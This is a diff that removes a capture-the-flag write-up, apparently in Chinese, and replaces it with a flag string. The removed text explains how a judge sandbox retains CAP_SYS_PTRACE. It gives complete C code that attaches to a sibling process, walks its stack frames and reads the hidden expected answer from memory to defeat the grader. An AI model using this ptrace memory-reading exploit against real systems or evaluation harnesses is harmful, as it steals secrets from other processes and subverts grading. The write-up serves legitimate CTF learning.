-    size_t i;
-    int    ret;
-
-    main_context_t ctx;
-
-    randval_t expect;  // 8字节随机数
-
-    if (prctl(PR_SET_CHILD_SUBREAPER, 1) == -1) err(EXIT_FAILURE, "prctl");
-
-    cfg = getcfg();
-
-    for (i = 0; i < cfg->count; i++) { // 进入次数循环
-        expect = getrand(); // 单轮随机数
-
-        ret = pipe2(ctx.pfd, O_CLOEXEC);
-        if (ret == -1) err(EXIT_FAILURE, "pipe2");
-
-        ctx.pid = fork();
-
-        switch (ctx.pid) {
-            case -1:
-                err(EXIT_FAILURE, "fork");
-            case 0:
-                medium(&ctx);  // 子进程
-            default:
-                judger(&ctx, &expect);  // 父进程
-                waitall();
-        }
-    }
-}
-
-```
-
-在judge代码中，不难发现提交的程序在运行时所输出的数据会这样流向judge()函数
-
-program -> proxy -> main
-
-所谓的“答案”，也就是随机数，是在main里生成的，然后被fork给了medium，即medium进程里存在mian的栈副本，其中就有“答案”
-
-然后medium进程继续fork，分离出了proxy进程；proxy继续调用isolate()，做了环境隔离，但是漏洞点之一是使用了CAP_SYS_PTRACE。
-
-我们只要通过调试进程，寻找到main或proxy进程的内存中随机数的值，再提交给proxy，即可完成解答。
-
-具体代码：
-```c
-#define _GNU_SOURCE
-#include <ctype.h>
-#include <dirent.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/ptrace.h>
-#include <sys/types.h>
-#include <sys/user.h>
-#include <sys/wait.h>
-#include <time.h>
-#include <unistd.h>
-
-// return address after medium(&ctx) in judge main()
-#define RET_MAIN_AFTER_MEDIUM 0x2030fbULL
-// expect is local variable at main_rbp - 0x20
-#define EXPECT_OFF_FROM_MAIN_RBP 0x20ULL
-
-static int read_file(const char *path, char *buf, size_t sz) {
-    int fd = open(path, O_RDONLY);
-    if (fd < 0) return -1;
-    ssize_t n = read(fd, buf, sz - 1);
-    close(fd);
-    if (n <= 0) return -1;
-    buf[n] = 0;
-    return 0;
-}
-
-static pid_t find_child_once(void) {
-    char path[128], buf[4096];
-    snprintf(path, sizeof(path), "/proc/self/task/%d/children", getpid());
-    if (read_file(path, buf, sizeof(buf)) == 0) {
-        char *p = buf;
-        while (*p && isspace((unsigned char)*p)) p++;
-        if (isdigit((unsigned char)*p)) {
-            long v = strtol(p, NULL, 10);
-            if (v > 1) return (pid_t)v;
-        }
-    }
-
-    DIR *d = opendir("/proc");
-    if (!d) return -1;
-    pid_t self = getpid();
-    struct dirent *de;
-    while ((de = readdir(d)) != NULL) {
-        if (!isdigit((unsigned char)de->d_name[0])) continue;
-        pid_t pid = (pid_t)strtol(de->d_name, NULL, 10);
-        if (pid <= 1 || pid == self) continue;
-        snprintf(path, sizeof(path), "/proc/%d/status", pid);
-        if (read_file(path, buf, sizeof(buf)) != 0) continue;
-        char *pp = strstr(buf, "\nPPid:");
-        if (!pp) continue;
-        long ppid = strtol(pp + 6, NULL, 10);
-        if ((pid_t)ppid == self) {
-            closedir(d);
-            return pid;
-        }
-    }
-    closedir(d);
-    return -1;
-}
-
-static pid_t find_child(void) {
-    struct timespec ts = {0, 1000000};
-    for (int i = 0; i < 2000; i++) {
-        pid_t p = find_child_once();
-        if (p > 0) return p;
-        nanosleep(&ts, NULL);
-    }
-    return -1;
-}
-
-static int peek_u64(pid_t pid, uint64_t addr, uint64_t *out) {
-    errno = 0;
-    long v = ptrace(PTRACE_PEEKDATA, pid, (void *)(uintptr_t)addr, NULL);
-    if (v == -1 && errno != 0) return -1;
-    *out = (uint64_t)(unsigned long)v;
-    return 0;
-}
-
-static int ptrace_get_answer(pid_t pid, uint64_t *answer) {
-    int st = 0;
-    struct user_regs_struct regs;
-
-    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) != 0) return -1;
-    if (waitpid(pid, &st, 0) < 0) {
-        ptrace(PTRACE_DETACH, pid, NULL, NULL);
-        return -1;
-    }
-
-    int ok = -1;
-    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == 0) {
-        uint64_t frame = (uint64_t)regs.rbp;
-
-        // Walk frame-pointer chain. The proxy child still keeps:
-        // main -> medium -> proxy/read/fork frames.
-        // The medium frame has return address 0x2030fb, and its saved rbp is main_rbp.
-        for (int depth = 0; depth < 12; depth++) {
-            uint64_t saved_rbp = 0, ret_addr = 0;
-            if (frame < 0x10000) break;
-            if (peek_u64(pid, frame, &saved_rbp) != 0) break;
-            if (peek_u64(pid, frame + 8, &ret_addr) != 0) break;
-
-            if (ret_addr == RET_MAIN_AFTER_MEDIUM) {
-                uint64_t main_rbp = saved_rbp;
-                if (peek_u64(pid, main_rbp - EXPECT_OFF_FROM_MAIN_RBP, answer) == 0)
-                    ok = 0;
-                break;
-            }
-
-            if (saved_rbp <= frame || saved_rbp - frame > 0x100000) break;
-            frame = saved_rbp;
-        }
-    }
-
-    ptrace(PTRACE_DETACH, pid, NULL, NULL);
-    return ok;
-}
-
-int main(void) {
-    uint64_t answer = 0;
-    pid_t child = find_child();
-    if (child > 0) {
-        ptrace_get_answer(child, &answer);
-    }
-    write(STDOUT_FILENO, &answer, sizeof(answer));
-    return 0;
-}
-
+flag{Min3cr@ft_1s-int3res71n9}ss
 ```
